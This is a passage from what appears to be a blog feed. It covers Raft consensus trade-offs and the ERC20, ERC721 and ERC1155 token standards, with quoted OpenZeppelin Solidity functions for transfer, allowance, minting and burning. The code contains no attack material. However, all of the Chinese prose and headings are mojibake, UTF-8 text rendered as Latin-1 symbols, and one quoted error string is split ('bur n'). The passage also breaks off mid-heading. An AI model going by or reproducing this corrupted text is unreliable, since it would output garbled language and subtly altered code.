</p><p>ï¼ˆ2ï¼‰å¤åˆ¶æ—¥å¿— Log Replicationï¼šleaderæ¥å—æ¥è‡ªå®¢æˆ·ç«¯çš„å‘½ä»¤ï¼Œè®°å½•ä¸ºæ—¥å¿—ï¼Œå¹¶å¤åˆ¶ç»™é›†ç¾¤ä¸­çš„å…¶ä»–æœåŠ¡å™¨ï¼Œå¹¶å¼ºåˆ¶å…¶ä»–èŠ‚ç‚¹çš„æ—¥å¿—ä¸leaderä¿æŒä¸€è‡´</p><h3 id="ä¼˜ç¼ºç‚¹-4"><a href="#ä¼˜ç¼ºç‚¹-4" class="headerlink" title="ä¼˜ç¼ºç‚¹"></a>ä¼˜ç¼ºç‚¹</h3><p><strong>ä¼˜ç‚¹ï¼š</strong></p><p>æ¨¡å‹æ¯”Paxosæ›´ç®€å•ï¼Œä½†æä¾›äº†åŒç­‰çš„å®‰å…¨æ€§ã€‚æœ‰å¤šç§è¯­è¨€çš„å®ç°å¯ç”¨ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong></p><p>1ï¼‰é€šå¸¸ç”¨äºç§æœ‰ç½‘ç»œå’Œè®¸å¯ç½‘ç»œ</p><p>2ï¼‰é¡ºåºæŠ•ç¥¨ï¼Œåªèƒ½ä¸²è¡Œapplyï¼Œå› æ­¤é«˜å¹¶å‘åœºæ™¯ä¸‹æ€§èƒ½å·®ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>å…±è¯†</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ERC20ã€ERC721ã€ERC1155æ ‡å‡†è§„èŒƒ</title>
    <link href="/2022/07/20/ERC20-ERC721-ERC1155/"/>
    <url>/2022/07/20/ERC20-ERC721-ERC1155/</url>
    
    <content type="html"><![CDATA[<p>ERCæ˜¯ç”±Etherumå¼€å‘äººå‘˜ä¸ºä»¥å¤ªåŠç¤¾åŒºç¼–å†™çš„ã€‚ä¸ºäº†åˆ›å»ºä¸€ä¸ªä»¥å¤ªåŠå¹³å°çš„æ ‡å‡†ï¼Œå¼€å‘äººå‘˜åº”å½“æäº¤äº†ä¸€ä¸ªä»¥å¤ªåŠæ”¹è¿›æ–¹æ¡ˆï¼ˆEIPï¼ŒEthereum Improvement Protocolï¼‰ï¼Œæ”¹è¿›æ–¹æ¡ˆä¸­åŒ…æ‹¬åè®®è§„èŒƒå’Œåˆçº¦æ ‡å‡†ã€‚ä¸€æ—¦EIPè¢«å§”å‘˜ä¼šæ‰¹å‡†å¹¶æœ€ç»ˆç¡®å®šï¼Œå®ƒå°±æˆä¸ºERCã€‚</p><p>ç”±äºè¿™äº›æ ‡å‡†ï¼Œæ™ºèƒ½åˆåŒå’Œä»¤ç‰Œäº¤äº’æ›´åŠ å®¹æ˜“ï¼Œå› æ­¤å¼€å‘äººå‘˜å¯ä»¥åœ¨ä»¥å¤ªåŠå­ä¸Šåˆ›å»º dappsã€‚ä½ ä¼šå¬åˆ°ä¸€ä¸ªå¸¸è§çš„ç±»æ¯”æ¥è§£é‡Šè¿™ä¸ªå¥½å¤„: ä»¥å¤ªåŠç±»ä¼¼äºIOSå’ŒAndroidçš„dappsâ€”â€”ä¸€ä¸ªæ”¯æŒåº”ç”¨ç¨‹åºå¹¶ä½¿å…¶æ˜“äºæ„å»ºçš„æ“ä½œç³»ç»Ÿã€‚</p><p>ç›®å‰ï¼Œæœ€å¸¸è§çš„ä»¥å¤ªç½‘æ ‡è®°æ ‡å‡†æ˜¯ERC-20å’ŒERC-721ã€‚</p><table><thead><tr><th align="left">æ ‡å‡†</th><th align="left">ERC-20</th><th align="left">ERC-721</th><th align="left">ERC-1155</th></tr></thead><tbody><tr><td align="left">ä»£å¸ç±»å‹</td><td align="left">åŒè´¨åŒ–ä»£å¸</td><td align="left">éåŒè´¨åŒ–ä»£å¸</td><td align="left">åŒè´¨åŒ–ä»£å¸ã€éåŒè´¨åŒ–ä»£å¸ã€ä»‹äºåŒè´¨åŒ–å’ŒéåŒè´¨åŒ–ä»£å¸ä¹‹é—´å¯ä»¥äº’ç›¸åˆ‡æ¢çš„ä»£å¸</td></tr><tr><td align="left">ç‰¹ç‚¹</td><td align="left">ä»£å¸å±æ€§ç›¸åŒã€å¯æ— æŸäº’æ¢ã€å¯æ‹†åˆ†</td><td align="left">ä»£å¸å±æ€§äº’ä¸ç›¸åŒã€ä¸å¯äº’æ¢ã€ä¸å¯æ‹†åˆ†</td><td align="left">å‰ä¸¤è€…çš„ç‰¹ç‚¹éƒ½æœ‰ï¼Œä¸”åœ¨ä¸€å®šç¨‹åº¦ä¸Šå¯ä»¥åœ¨ä¸¤è€…ä¸­åˆ‡æ¢</td></tr><tr><td align="left">ç”Ÿæˆå¤„ç†</td><td align="left">ä¸€æ¬¡æ€§åªèƒ½ç”Ÿæˆä¸€ç§ ERC-20 ä»£å¸ï¼Œä¸€æ¬¡æ€§åªèƒ½è¿›è¡Œå•ç¬”å•å¯¹è±¡äº¤æ˜“ï¼Œå¹¶ä¸”äº¤æ˜“å¤„ç†éœ€è¦å¤šæ¬¡æ‰¹å‡†</td><td align="left">ä¸€æ¬¡æ€§åªèƒ½ç”Ÿæˆä¸€ç§ ERC-721 ä»£å¸ï¼Œä¸€æ¬¡æ€§åªèƒ½è¿›è¡Œå•ç¬”å•å¯¹è±¡äº¤æ˜“ï¼Œå¹¶ä¸”äº¤æ˜“å¤„ç†éœ€è¦å¤šæ¬¡æ‰¹å‡†</td><td align="left">ä¸€æ¬¡æ€§å¯ä»¥ç”Ÿæˆå¤šç§ ERC-1155 ä»£å¸èµ„äº§ç±»åˆ«ï¼Œä¸€æ¬¡æ€§å¯ä»¥è¿›è¡Œå¤šç¬”å¤šå¯¹è±¡äº¤æ˜“ï¼Œäº¤æ˜“å¤„ç†åªéœ€è¦ä¸€æ¬¡æ‰¹å‡†</td></tr></tbody></table><h1 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h1><p><a href="https://docs.openzeppelin.com/contracts/4.x/erc20">ERC20å®˜æ–¹æ–‡æ¡£</a></p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/token/ERC20">ERC20åˆçº¦ä»£ç </a></p><p>ERC-20æ˜¯æœ€å¹¿ä¸ºäººçŸ¥çš„æ ‡å‡†ã€‚</p><p>ERC-20æ ‡å‡†è§„å®šä»¤ç‰Œå¿…é¡»æœ‰å…¶åç§°ã€ç¬¦å·ã€æ€»ä¾›åº”é‡å’Œå…¶ä»–åŠŸèƒ½ï¼ŒåŒ…æ‹¬è½¬è´¦å’Œæ±‡æ¬¾ã€‚è¿™ä¸ªæ ‡å‡†çš„ä¼˜ç‚¹æ˜¯ï¼Œåªè¦ä»¤ç‰Œç¬¦åˆ erc-20æ ‡å‡†ï¼Œå®ƒå°†ä¸ä»¥å¤ªé’±åŒ…å…¼å®¹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä½ å¯ä»¥æŠŠä»£å¸åŠ åˆ°ä½ çš„ä»¥å¤ªåŠé’±åŒ…é‡Œï¼Œç„¶åé€šè¿‡ä½ çš„é’±åŒ…å‘é€ç»™åˆ«äººã€‚</p><p>ERC20 çš„åŠŸèƒ½åŒ…æ‹¬ä½†ä¸é™äºä»¥ä¸‹å‡ ç‚¹ï¼š</p><ul><li>è½¬è´¦ï¼šå°†ä»£å¸ä»ä¸€ä¸ªå¸æˆ·è½¬åˆ°å¦ä¸€ä¸ªå¸æˆ·</li><li>æŸ¥è¯¢ä½™é¢ï¼šè·å–å¸æˆ·çš„å½“å‰ä»£å¸ä½™é¢</li><li>æŸ¥è¯¢æ€»é‡ï¼šè·å–ç½‘ç»œä¸Šå¯ç”¨ä»£å¸çš„æ€»ä¾›åº”é‡</li><li>ä»£å¸æˆæƒï¼šæ‰¹å‡†ä¸€ä¸ªå¸æˆ·ä¸­ä¸€å®šçš„ä»£å¸é‡‘é¢ç”±ç¬¬ä¸‰æ–¹å¸æˆ·ä½¿ç”¨</li></ul><p><img src="/2022/07/20/ERC20-ERC721-ERC1155/image-20220710192753893.png" alt="image-20220710192753893"></p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol">ERC-20</a>å…·ä½“å®ç°äº†ä»¥ä¸Š<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol">IERC-20</a>æ¥å£</p><h2 id="åŸºæœ¬å˜é‡"><a href="#åŸºæœ¬å˜é‡" class="headerlink" title="åŸºæœ¬å˜é‡"></a>åŸºæœ¬å˜é‡</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint256 private _totalSupply;//å‘è¡Œæ€»é‡<br>string private _name;//ä»£å¸åç§°<br>string private _symbol;//ä»£å¸æ ‡è¯†ç¬¦<br></code></pre></td></tr></table></figure><h2 id="æ„é€ å‡½æ•°"><a href="#æ„é€ å‡½æ•°" class="headerlink" title="æ„é€ å‡½æ•°"></a>æ„é€ å‡½æ•°</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">constructor (string memory name_, string memory symbol_) &#123;<br>    _name = name_;//åˆå§‹åŒ–ä»£å¸åç§°<br>    _symbol = symbol_;//åˆå§‹åŒ–ä»£å¸æ ‡è¯†ç¬¦<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æŸ¥è¯¢å‡½æ•°"><a href="#æŸ¥è¯¢å‡½æ•°" class="headerlink" title="æŸ¥è¯¢å‡½æ•°"></a>æŸ¥è¯¢å‡½æ•°</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br>    * @dev Returns the name of the token.<br>    */<br>   function name() public view virtual override returns (string memory) &#123;<br>       return _name;<br>   &#125;<br><br>   /**<br>    * @dev Returns the symbol of the token, usually a shorter version of the<br>    * name.<br>    */<br>   function symbol() public view virtual override returns (string memory) &#123;<br>       return _symbol;<br>   &#125;<br><br>   /**<br>    * @dev Returns the number of decimals used to get its user representation.<br>    * For example, if `decimals` equals `2`, a balance of `505` tokens should<br>    * be displayed to a user as `5,05` (`505 / 10 ** 2`).<br>    *<br>    * Tokens usually opt for a value of 18, imitating the relationship between<br>    * Ether and Wei. This is the value &#123;ERC20&#125; uses, unless this function is<br>    * overloaded;<br>    *<br>    * NOTE: This information is only used for _display_ purposes: it in<br>    * no way affects any of the arithmetic of the contract, including<br>    * &#123;IERC20-balanceOf&#125; and &#123;IERC20-transfer&#125;.<br>    */<br>   function decimals() public view virtual override returns (uint8) &#123;<br>       return 18;<br>   &#125;<br><br>   /**<br>    * @dev See &#123;IERC20-totalSupply&#125;.<br>    */<br>   function totalSupply() public view virtual override returns (uint256) &#123;<br>       return _totalSupply;<br>   &#125;<br><br>   /**<br>    * @dev See &#123;IERC20-balanceOf&#125;.<br>    */<br>   function balanceOf(address account) public view virtual override returns (uint256) &#123;<br>       return _balances[account];<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="è½¬è´¦é€»è¾‘"><a href="#è½¬è´¦é€»è¾‘" class="headerlink" title="è½¬è´¦é€»è¾‘"></a>è½¬è´¦é€»è¾‘</h2><p>è½¬è´¦æ˜¯ERC20çš„å…³é”®æ‰€åœ¨</p><p>ERC20ä¸­æœ‰ä¸¤ä¸ªå‡½æ•°å¯ä»¥ç”¨æ¥è½¬è´¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br>    * @dev See &#123;IERC20-transfer&#125;.<br>    *<br>    * Requirements:<br>    *<br>    * - `recipient` cannot be the zero address.<br>    * - the caller must have a balance of at least `amount`.<br>    */<br>   function transfer(address recipient, uint256 amount) public virtual override returns (bool) &#123;<br>       _transfer(_msgSender(), recipient, amount);<br>       return true;<br>   &#125;<br>   <br>   /**<br>    * @dev See &#123;IERC20-transferFrom&#125;.<br>    *<br>    * Emits an &#123;Approval&#125; event indicating the updated allowance. This is not<br>    * required by the EIP. See the note at the beginning of &#123;ERC20&#125;.<br>    *<br>    * Requirements:<br>    *<br>    * - `sender` and `recipient` cannot be the zero address.<br>    * - `sender` must have a balance of at least `amount`.<br>    * - the caller must have allowance for ``sender``&#x27;s tokens of at least<br>    * `amount`.<br>    */<br>   function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) &#123;<br>       _transfer(sender, recipient, amount);<br><br>       uint256 currentAllowance = _allowances[sender][_msgSender()];<br>       require(currentAllowance &gt;= amount, &quot;ERC20: transfer amount exceeds allowance&quot;);<br>       _approve(sender, _msgSender(), currentAllowance - amount);<br><br>       return true;<br>   &#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­éƒ½è°ƒç”¨äº† <code>_transfer</code> æ¥å®ç°è½¬è´¦é€»è¾‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br>    * @dev Moves tokens `amount` from `sender` to `recipient`.<br>    *<br>    * This is internal function is equivalent to &#123;transfer&#125;, and can be used to<br>    * e.g. implement automatic token fees, slashing mechanisms, etc.<br>    *<br>    * Emits a &#123;Transfer&#125; event.<br>    *<br>    * Requirements:<br>    *<br>    * - `sender` cannot be the zero address.<br>    * - `recipient` cannot be the zero address.<br>    * - `sender` must have a balance of at least `amount`.<br>    */<br>   function _transfer(address sender, address recipient, uint256 amount) internal virtual &#123;<br>       require(sender != address(0), &quot;ERC20: transfer from the zero address&quot;);<br>       require(recipient != address(0), &quot;ERC20: transfer to the zero address&quot;);<br><br>       _beforeTokenTransfer(sender, recipient, amount);<br><br>       uint256 senderBalance = _balances[sender];<br>       require(senderBalance &gt;= amount, &quot;ERC20: transfer amount exceeds balance&quot;);<br>       _balances[sender] = senderBalance - amount;<br>       _balances[recipient] += amount;<br><br>       emit Transfer(sender, recipient, amount);<br>   &#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>transferFrom</code> æ–¹æ³•ç”¨äºææ¬¾æµç¨‹ï¼Œå…è®¸åˆçº¦ä»£è¡¨ä»£å¸æ‰€æœ‰è€…è´¦æˆ·è½¬ç§»ä»£å¸ã€‚ å³ä»Aè´¦æˆ·åˆ°Bè´¦æˆ·ï¼Œå†ç”±Bè´¦æˆ·åˆ°Cè´¦æˆ·ã€‚ä¾‹å¦‚ï¼Œè¿™å¯ç”¨äºå…è®¸åˆçº¦ä»£è¡¨ä»£å¸æ‰€æœ‰è€…è½¬ç§»ä»£å¸å’Œ/æˆ–ä»¥æ¬¡çº§è´§å¸ï¼ˆsub-currencyï¼‰çš„å½¢å¼æ”¶å–è´¹ç”¨ã€‚è‹¥å‡½æ•°è°ƒç”¨è€…æ²¡æœ‰å¾—åˆ°_fromè´¦æˆ·çš„æˆæƒï¼Œæˆ–æˆæƒè½¬è´¦çš„é¢åº¦å°äºè½¬è´¦çš„é¢åº¦ï¼Œè¯¥å‡½æ•°åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸å¹¶å›æ»šã€‚</p><p>å¯ä»¥ä½¿ç”¨ <code>approve</code> æ¥è®¾ç½®æˆæƒè½¬è´¦çš„é¢åº¦ï¼Œ ç”¨ <code>allowance</code> æ¥æŸ¥è¯¢å·²æˆæƒçš„è½¬è´¦é¢åº¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev See &#123;IERC20-allowance&#125;.<br> */<br>function allowance(address owner, address spender) public view virtual override returns (uint256) &#123;<br>    return _allowances[owner][spender];<br>&#125;<br><br>/**<br> * @dev See &#123;IERC20-approve&#125;.<br> *<br> * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on<br> * `transferFrom`. This is semantically equivalent to an infinite approval.<br> *<br> * Requirements:<br> *<br> * - `spender` cannot be the zero address.<br> */<br>function approve(address spender, uint256 amount) public virtual override returns (bool) &#123;<br>    address owner = _msgSender();<br>    _approve(owner, spender, amount);<br>    return true;<br>&#125;<br></code></pre></td></tr></table></figure><p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸¤ä¸ªç”¨äºå¢åŠ å’Œå‡å°‘æˆæƒé¢åº¦çš„å‡½æ•°â€”â€” <code>increaseAllowance</code> ã€<code>decreaseAllowance</code> ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°ä¸»è¦ç”¨äºåœ¨åŸæœ‰çš„æˆæƒåŸºç¡€ä¹‹ä¸Šå†å¢åŠ æˆæƒé¢åº¦æˆ–è€…å‡å°‘æˆæƒé¢åº¦çš„æ“ä½œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev Atomically increases the allowance granted to `spender` by the caller.<br> *<br> * This is an alternative to &#123;approve&#125; that can be used as a mitigation for<br> * problems described in &#123;IERC20-approve&#125;.<br> *<br> * Emits an &#123;Approval&#125; event indicating the updated allowance.<br> *<br> * Requirements:<br> *<br> * - `spender` cannot be the zero address.<br> */<br>function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) &#123;<br>    address owner = _msgSender();<br>    _approve(owner, spender, allowance(owner, spender) + addedValue);<br>    return true;<br>&#125;<br><br>/**<br> * @dev Atomically decreases the allowance granted to `spender` by the caller.<br> *<br> * This is an alternative to &#123;approve&#125; that can be used as a mitigation for<br> * problems described in &#123;IERC20-approve&#125;.<br> *<br> * Emits an &#123;Approval&#125; event indicating the updated allowance.<br> *<br> * Requirements:<br> *<br> * - `spender` cannot be the zero address.<br> * - `spender` must have allowance for the caller of at least<br> * `subtractedValue`.<br> */<br>function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) &#123;<br>    address owner = _msgSender();<br>    uint256 currentAllowance = allowance(owner, spender);<br>    require(currentAllowance &gt;= subtractedValue, &quot;ERC20: decreased allowance below zero&quot;);<br>    unchecked &#123;<br>        _approve(owner, spender, currentAllowance - subtractedValue);<br>    &#125;<br><br>    return true;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="é“¸å¸æ“ä½œ"><a href="#é“¸å¸æ“ä½œ" class="headerlink" title="é“¸å¸æ“ä½œ"></a>é“¸å¸æ“ä½œ</h2><p>ERC-20ä¸­ä¹Ÿæä¾›äº†é“¸å¸å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¸»è¦ç”¨äºå¢å‘ä»£å¸æ“ä½œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/** @dev Creates `amount` tokens and assigns them to `account`, increasing<br> * the total supply.<br> *<br> * Emits a &#123;Transfer&#125; event with `from` set to the zero address.<br> *<br> * Requirements:<br> *<br> * - `account` cannot be the zero address.<br> */<br>function _mint(address account, uint256 amount) internal virtual &#123;<br>    require(account != address(0), &quot;ERC20: mint to the zero address&quot;);<br><br>    _beforeTokenTransfer(address(0), account, amount);<br><br>    _totalSupply += amount;<br>    unchecked &#123;<br>        // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.<br>        _balances[account] += amount;<br>    &#125;<br>    emit Transfer(address(0), account, amount);<br><br>    _afterTokenTransfer(address(0), account, amount);<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="ä»£å¸é”€æ¯"><a href="#ä»£å¸é”€æ¯" class="headerlink" title="ä»£å¸é”€æ¯"></a>ä»£å¸é”€æ¯</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev Destroys `amount` tokens from `account`, reducing the<br> * total supply.<br> *<br> * Emits a &#123;Transfer&#125; event with `to` set to the zero address.<br> *<br> * Requirements:<br> *<br> * - `account` cannot be the zero address.<br> * - `account` must have at least `amount` tokens.<br> */<br>function _burn(address account, uint256 amount) internal virtual &#123;<br>    require(account != address(0), &quot;ERC20: bur n from the zero address&quot;);<br><br>    _beforeTokenTransfer(account, address(0), amount);<br><br>    uint256 accountBalance = _balances[account];<br>    require(accountBalance &gt;= amount, &quot;ERC20: burn amount exceeds balance&quot;);<br>    unchecked &#123;<br>        _balances[account] = accountBalance - amount;<br>        // Overflow not possible: amount &lt;= accountBalance &lt;= totalSupply.<br>        _totalSupply -= amount;<br>    &#125;<br><br>    emit Transfer(account, address(0), amount);<br><br>    _afterTokenTransfer(account, address(0), amount);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ERC721"><a href="#ERC721" class="headerlink" title="ERC721"></a>ERC721</h1><p><a href="https://docs.openzeppelin.com/contracts/4.x/erc721">ERC721å®˜æ–¹æ–‡æ¡£</a></p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/token/ERC721">ERC721åˆçº¦ä»£ç </a></p><p>ERC-721æ ‡å‡†è§„å®šï¼Œæ¯ä¸ªç¬¦åˆå…¶æ ‡å‡†çš„ä»¤ç‰Œéƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„ä»¤ç‰Œæ ‡è¯†ã€‚ERC721 ä»£è¡¨<a href="https://docs.openzeppelin.com/contracts/4.x/tokens#different-kinds-of-tokens"><em>ä¸å¯æ›¿ä»£</em></a><a href="https://docs.openzeppelin.com/contracts/4.x/tokens#different-kinds-of-tokens">ä»£å¸</a>æ‰€æœ‰æƒçš„æ ‡å‡†ã€‚åœ¨ERC-721æ ‡å‡†ä¸­ï¼Œæ¯ä¸ªä»¤ç‰Œéƒ½æ˜¯å”¯ä¸€çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ERC-721æ ‡å‡†ä¸‹ï¼Œä½ çš„100å…ƒå’Œæˆ‘çš„100å…ƒæ˜¯ä¸ä¸€æ ·çš„ï¼Œå› ä¸ºä¸¤ä¸ª100å…ƒçš„æ•°å­—æ˜¯ä¸ä¸€æ ·çš„ã€‚</p><p>æ¯ä¸€ä¸ªNFTéƒ½æœ‰ä¸€ä¸ªuint256ç±»å‹çš„å˜é‡ï¼Œåä¸ºtokenIdï¼Œæ‰€ä»¥å¯¹äºä»»ä½•ERC721åˆçº¦ï¼Œè¿™å¯¹å€¼&lt;contract address, tokenId&gt;å¿…é¡»æ˜¯å…¨å±€å”¯ä¸€çš„ã€‚</p><p>ERC721çš„åŠŸèƒ½åŒ…æ‹¬ä½†ä¸é™äºä»¥ä¸‹å‡ ç‚¹ï¼š</p><ul><li>è½¬è´¦ï¼šå°†ä»£å¸ä»ä¸€ä¸ªå¸æˆ·è½¬ç§»åˆ°å¦ä¸€ä¸ªå¸æˆ·ï¼›</li><li>æŸ¥è¯¢ä½™é¢ï¼šè·å–å¸æˆ·çš„å½“å‰ä»£å¸ä½™é¢ï¼›</li><li>æŸ¥è¯¢æ‰€æœ‰è€…ï¼šè·å–ä»£å¸çš„æ‰€æœ‰è€…ï¼›</li><li>æŸ¥è¯¢æ€»é‡ï¼šè·å–æ•´ä¸ªç½‘ç»œçš„å¯ç”¨ä»£å¸æ€»ä¾›åº”é‡ï¼›</li><li>ä»£å¸æˆæƒï¼šæ‰¹å‡†å¸æˆ·ä¸­ä¸€å®šæ•°é‡çš„ä»£å¸å¯ä»¥è¢«ç¬¬ä¸‰æ–¹å¸æˆ·è½¬ç§»ã€‚</li></ul><p><img src="/2022/07/20/ERC20-ERC721-ERC1155/image-20220710223711603.png" alt="image-20220710223711603"></p><p><img src="/2022/07/20/ERC20-ERC721-ERC1155/image-20220710223726455.png" alt="image-20220710223726455"></p><h2 id="åŸºæœ¬å˜é‡-1"><a href="#åŸºæœ¬å˜é‡-1" class="headerlink" title="åŸºæœ¬å˜é‡"></a>åŸºæœ¬å˜é‡</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// Token name<br>string private _name;<br><br>// Token symbol<br>string private _symbol;<br><br>// Mapping from token ID to owner address<br>mapping(uint256 =&gt; address) private _owners;<br><br>// Mapping owner address to token count<br>mapping(address =&gt; uint256) private _balances;<br><br>// Mapping from token ID to approved address<br>mapping(uint256 =&gt; address) private _tokenApprovals;<br><br>// Mapping from owner to operator approvals<br>mapping(address =&gt; mapping(address =&gt; bool)) private _operatorApprovals;<br></code></pre></td></tr></table></figure><h2 id="æ„é€ å‡½æ•°-1"><a href="#æ„é€ 